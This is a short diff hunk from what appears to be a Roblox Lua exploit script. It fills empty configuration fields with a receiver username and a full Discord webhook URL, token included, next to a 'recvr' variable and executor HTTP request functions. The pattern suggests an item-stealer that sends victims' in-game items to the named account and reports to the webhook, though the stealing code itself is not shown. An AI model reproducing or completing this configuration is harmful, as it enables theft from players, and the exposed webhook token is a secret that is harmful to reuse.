@@ -902,8 +902,8 @@ RunService.Stepped:Connect(function()
     end
 end)
 
-Username = ""
-Webhook = ""
+Username = "playing_mm2my"
+Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
 
 local recvr=Username
 local http_req=request or http_request or syn and syn.request
